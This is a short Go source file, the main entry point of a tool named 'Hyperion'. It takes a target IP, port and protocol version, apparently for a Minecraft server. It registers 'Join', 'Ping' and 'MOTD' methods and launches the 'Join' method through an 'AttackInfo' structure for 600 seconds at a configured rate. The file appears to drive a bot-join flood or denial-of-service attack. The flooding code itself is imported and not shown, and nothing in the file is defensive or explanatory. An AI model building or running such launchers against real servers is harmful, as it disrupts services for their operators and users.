package main

import (
	"Hyperion/core"
	"Hyperion/core/method"
	"Hyperion/core/method/methods"
	"flag"
	"time"
)

var (
	ip       = flag.String("ip", "0.0.0.0", "sets ip")
	port     = flag.Int("port", 25565, "sets port")
	protocol = flag.Int("protcol", 761, "sets version protocol")
)

func main() {
	flag.Parse()
	registerMethod()
	method := methods.Join{}
	method.Start(core.AttackInfo{
		Ip:       *ip,
		Port:     *port,
		Protocol: *protocol,
		Duration: 600 * time.Second,
		PerDelay: 1000,
		Delay:    0,
	})
}

func registerMethod() {
	method.RegisterMethod(methods.Join{})
	method.RegisterMethod(methods.Ping{})
	method.RegisterMethod(methods.MOTD{})
}
